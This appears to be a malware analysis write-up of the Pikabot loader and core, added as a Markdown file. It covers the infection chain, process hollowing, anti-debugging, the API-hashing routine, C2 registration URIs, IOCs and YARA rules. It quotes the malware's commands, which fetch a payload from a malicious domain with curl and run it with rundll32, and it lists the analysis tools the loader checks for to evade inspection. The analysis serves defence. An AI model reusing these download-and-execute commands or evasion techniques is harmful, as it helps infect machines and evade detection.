@@ -1,0 +1,315 @@
+# Pikabot Analysis
+
+
+
+## Executive Summary
+
+- *Pikabot* used indirect syscalls to evade detection.
+- *Pikabot* used RC4 for strings encryption/decryption.
+- *Pikabot* used varouis anti-analysis techniques to slow down the analysis.
+
+
+## Infection Chain
+
+The infection chain start with running a copy of the legitimate file for Windows Write (write.exe) that will side-loads malicious DLL named edputil.dll, then it will download the packed Pikabot DLL.
+after unpacking the Pikabot Loader will decrypt and inject the core module into the created process "ctfmon.exe".
+
+{{< mermaid >}}
+  graph TD
+	0("Phishing Email with Attached ISO image")
+	1("copy of write.exe side-loads malicious DLL named edputil.dll")
+	2("side-loaded DLL retrieves and runs Pikabot Loader")
+	3("Pikabot Loader decrypt and inject Core Module")
+    4("ctfmon.exe (Pikabot Core Module)")
+	 0 --> | victim runs the executable | 1
+	 1 --> |  | 2
+	 2 --> |  | 3
+     3 --> | create | 4
+     3 --> | process hollowing | 4
+
+
+{{< /mermaid >}}
+*Figure 1. Pikabot Infection Chain*
+
+**The loaded DLL runs multiple commands to download and run the Pikabot malware.**
+```text
+    cmd /c data\\document.rtf"
+    cmd.exe /c md c:\\wnd
+    cmd.exe /c curl.exe --output c:\\wnd\\3291.png --url https://yourunitedlaws.com/mrD/4462
+    rundll32 c:\\wnd\\3291.png,GetModuleProp
+```
+<p align="center">
+  <img src="/images/download-pikabot.png">
+</p>
+
+*Figure 2. commands executed by edputil.dll*
+
+### Unpacking
+**The loader extracts its stage 2 payload from the `.rsrc` section, It then decrypts it.**
+
+<p align="center">
+  <img src="/images/decrypting.png">
+</p>
+
+*Figure 3. Decrypting `.rsrc` section.*
+
+**The next step of the process is to reflectively load the PE file within the currently executing process. This technique involves dynamically loading the PE file's contents into memory and executing it, without the need for the file to be physically written to disk.**
+
+<p align="center">
+  <img src="/images/copy-headers.png">
+  <img src="/images/copy-sections.png">
+  <img src="/images/fix-reloc.png">
+  <img src="/images/run-stage-2.png">
+</p>
+
+*Figure 4. Reflectively loading PE.*
+
+
+## Pikabot Loader
+
+### Indirect syscall
+**Pikabot used Indirect syscalls to stay under the radar and evade EDR user-land hooking, as well as debugging attempts.**
+
+<p align="center">
+  <img src="/images/indirect-syscall.png">
+</p>
+
+*Figure 4. Indirect syscall.*
+
+### Anti-debugging
+**The Pikabot Loader runs multiple checks using NtQuerySystemInformation and NtQueryInformationProcess to detect if it's beign debugged.**
+
+<p align="center">
+  <img src="/images/anti-debug-check-1.png">
+  <img src="/images/anti-debug-check-2.png">
+  <img src="/images/anti-debug-check-3.png">
+  <img src="/images/anti-debug-check-4.png">
+</p>
+
+*Figure 5. Anti-debugging checks.*
+
+
+**The Loader will resolve APIs from ntdll and kernel32 dll by hash, and store them into a global structure**
+```c
+	struct ctx
+	{
+	  DWORD is_bieng_debugg;
+	  DWORD LdrLoadDll;
+	  DWORD LdrGetProcedureAddress;
+	  DWORD RtlAllocateHeap;
+	  DWORD RtlFreeHeap;
+	  DWORD RtlDecompressBuffer;
+	  DWORD RtlCreateProcessParametersEx;
+	  DWORD RtlDestroyProcessParameters;
+	  DWORD ExitProcess;
+	  DWORD CheckRemoteDebuggerPresent;
+	  DWORD VirtualAlloc;
+	  DWORD GetThreadContext;
+	  DWORD VirtualFree;
+	  DWORD CreateToolhelp32Snapshot;
+	  DWORD Process32FirstW;
+	  DWORD Process32NextW;
+	  DWORD ntdll;
+	  DWORD kernel32;
+	  DWORD dw1;
+	  DWORD core_module_payload;
+	  DWORD core_module_payload_size;
+	  DWORD Teb;
+	};
+```
+**API hashing algorithm used by the loader :**
+```python
+def get_hash(str):
+    hash = 0x1EC8
+    
+    for c in str:
+        if ord(c) > 0x60:
+            hash = ord(c) + (33 * hash) - 32
+        else:
+            hash = ord(c) + (33 * hash)
+    
+    return hash & 0xFFFFFFFF
+```
+
+**Next, the Loader will check for list of process. if any process is running, the malware will exit without loading the core module. these are the process that is being checked:**
+
+```text
+	- ProcessHacker.exe
+	- tcpview.exe
+	- autorunsc.exe
+	- filemon.exe
+	- procmon.exe
+	- regmon.exe
+	- procexp.exe
+	- idaq.exe
+	- idaq64.exe
+	- x32dbg.exe
+	- x64dbg.exe
+	- Fiddler.exe
+	- httpdebugger.exe
+	- cheatengine-i386.exe
+	- cheatengine-x86_64.exe
+	- cheatengine-x86_64-SSE4-AVX2.exe
+	- LordPE.exe
+	- SysInspector.exe
+	- sniff_hit.exe
+	- windbg.exe
+	- joeboxcontrol.exe
+	- joeboxserver.exe
+	- ResourceHacker.exe
+	- dumpcap.exe
+```
+
+### Process Hollowing
+**Pikabot Loader stores the core module in the `.data` section in base64-encoded chunks, each chunk encrypted with RC4 and have a unique key. After decoding and decrypting the core module, The Loader launch `ctfmon.exe` process and inject it with the core module.**
+
+<p align="center">
+  <img src="/images/inject-1.png">
+  <img src="/images/inject-2.png">
+  <img src="/images/inject-3.png">
+</p>
+
+*Figure 6. using `RtlCreateProcessParametersEx`, `NtCreateUserProcess`, `RtlDestroyProcessParameters` to create process.*
+
+**After Decompressing the payload with `RtlDecompressBuffer`, it will use [Process Hollowing](https://attack.mitre.org/techniques/T1055/012/) technique to inject the core module.**
+
+<p align="center">
+  <img src="/images/decompress-buffer.png">
+</p>
+
+*Figure 7. Decompressing the payload with `RtlDecompressBuffer`*
+
+<p align="center">
+  <img src="/images/inject-4.png">
+  <img src="/images/inject-5.png">
+</p>
+
+*Figure 8. Process Hollowing*
+
+## Pikabot Core
+**PIKABOT Loads and uses API hashing to resolve needed libraries at runtime. Next, it validates the victim machine by verifying the language identifier using GetUserDefaultLangID. If the LangID is set to Russian (0x419) or Ukranian (0x422), the malware will immediately stop its execution.**
+
+![](/images/check-system-language.png)
+
+*Figure 9. Checking system language*
+
+**Pikabot creates a mutex to prevent reinfection on the same machine. Mutex: {A7C67034-A769-4D94-B727-B30C6C7F66FC}**
+**Next, the Core will extract its confugiration, which will contain IP addresses, URIs, Pikabot version, and additional HTTP headers.**
+
+<p align="center">
+  <img src="/images/config.png">
+</p>
+
+*Figure 10. Pikabot core config*
+
+
+**The next phase involves collecting victim machine information :**
+
+- Retrieves the name of the user associated with the PIKABOT thread.
+- Retrieves the computer name.
+- Gets processor information.
+- Grabs display device information using EnumDisplayDevicesW.
+- Retrieves domain controller information using DsGetDcNameW.
+- Collects current usage around physical and virtual memory using GlobalMemoryStatusEx.
+- Gets the window dimensions using GetWindowRect used to identify sandbox environments.
+- Retrieves Windows OS product information using RtlGetVersion.
+- Uses CreateToolhelp32Snapshot to retrieve process information.
+
+**The collected victim machine information will be encrypted with random generated key and random generated number of bytes to shift from the end of the encrypted data to the start of the encrypted data.**
+
+<p align="center">
+  <img src="/images/collected-system-infos.png">
+</p>
+
+*Figure 11. Initial request Body*
+
+**Pikabot registers the bot by sending previously collected information to a random URI.**
+```
+api/auth.revoke
+api/apps.permissions.info
+api/admin.conversations.restrictAccess.removeGroup
+api/admin.emoji.add
+api/admin.apps.restrict
+api/auth.test
+api/admin.conversations.archive
+api/admin.conversations.restrictAccess.addGroup
+api/apps.event.authorizations.list
+api/admin.emoji.addAlias
+api/admin.conversations.getConversationPrefs
+api/admin.users.setOwner
+api/admin.inviteRequests.approved.list
+api/admin.conversations.create
+api/admin.conversations.inviteBapi/admin.usergroups.listChannels
+api/apps.permissions.users.request
+api/admin.users.remove
+api/admin.conversations.ekm.listOriginalConnectedChannelInfo
+api/admin.inviteRequests.denied.list
+api/admin.apps.approve
+api/admin.users.list
+api/admin.emoji.list
+api/admin.conversations.rename
+```
+**Next, Pikabot will Request for next commands to execute.**
+
+![](/images/c2-cmds.png)
+
+
+## IOCs
+
+| Type    | Indicator                                                        | Name        | Description                                     |
+| ----    | ---------------------------------------------------------------- | ----------- | ----------------------------------------------- |
+| IPv4    | 94.72.104[.]77:13724                                             |             | Pikabot C2 server                               | 
+| IPv4    | 154.12.236[.]248:13786                                           |             | Pikabot C2 server                               | 
+| IPv4    | 84.46.240[.]42:2083                                              |             | Pikabot C2 server                               |
+| IPv4    | 94.72.104[.]80:5000                                              |             | Pikabot C2 server                               |
+| IPv4    | 198.38.94[.]213:2224                                             |             | Pikabot C2 server                               |
+| IPv4    | 45.77.63[.]237:22                                                |             | Pikabot C2 server                               |
+| IPv4    | 70.34.199[.]64:9785                                              |             | Pikabot C2 server                               |
+| IPv4    | 70.34.223[.]164:9785                                             |             | Pikabot C2 server                               | 
+| IPv4    | 70.34.223[.]164:5000                                             |             | Pikabot C2 server                               |
+| IPv4    | 158.247.240[.]58:22                                              |             | Pikabot C2 server                               |
+| IPv4    | 154.53.55[.]165:13783                                            |             | Pikabot C2 server                               |
+| IPv4    | 209.126.86[.]48:1194                                             |             | Pikabot C2 server                               |
+| Domain  | yourunitedlaws[.]com                                             |             | Hosting infra for Pikabot loader                |
+| SHA-256 | 905a3a144f94a38ac6059759879caec19cff446b98c24bb2035b3293330e03b2 | edputil.dll | Side-loaded DLL used to download Pikabot loader |    
+| SHA-256 | fb8e3ef19f0a3ad298b8d315a716aae1151332c1f097296962a3a04017f940ae |             | Downloaded Pikabot DLL                          |
+| SHA-256 | 6c5f88c7d2bc6f75264eecc733e74f9b5aa88a54881978dabbc68a8aa5928fc8 |             | Pikabot loader                                  |
+| SHA-256 | cfcf2c1f9f72e719d7a50f0a07c081b8353ae8c04dff2ea9284230539a59d7ac |             | Pikabot core                                    |
+| Mutex   | {A7C67034-A769-4D94-B727-B30C6C7F66FC}                           |             |                                                 |
+
+## Detection
+### YARA
+```c
+
+rule Pikabot_loader{
+	meta:
+    	author      = "Cr4CK3d"
+    	description = "Detect Pikabot Loader"
+    	created     = "2024-04-19"
+
+    strings:
+		$NtCreateUserProcess_syscall = { 68 2C B1 AC 82 E8 5F FF FF FF }
+		$rc4_decrypt_core = {F7 FF 8A 84 15 ?? ?? ?? ?? 89 D1 8A 94 1D ?? ?? ?? ?? 88 94 0D ?? ?? ?? ?? 8B 55 08 88 84 1D ?? ?? ?? ?? 02 84 0D ?? ?? ?? ?? 0F B6 C0 8A 84 05 ?? ?? ?? ?? 32 04 32}
+
+    
+    condition:
+    	1 of them
+}
+
+rule Pikabot_core{
+	meta:
+    	author      = "Cr4CK3d"
+    	description = "Detect Pikabot core"
+    	created     = "2024-04-19"
+
+    strings:
+    	$c2_commands = { 6F 24 [6] CB 0A [6] 6C 03 [6] 92 07 }
+    	$debug_check = { E8 ?? ?? ?? ?? 3D 00 25 00 00 75 }
+    condition:
+    	1 of them
+}
+
+```
+
+## Downloads
+- [malware-traffic-analysis](https://www.malware-traffic-analysis.net/2024/03/06/index.html)
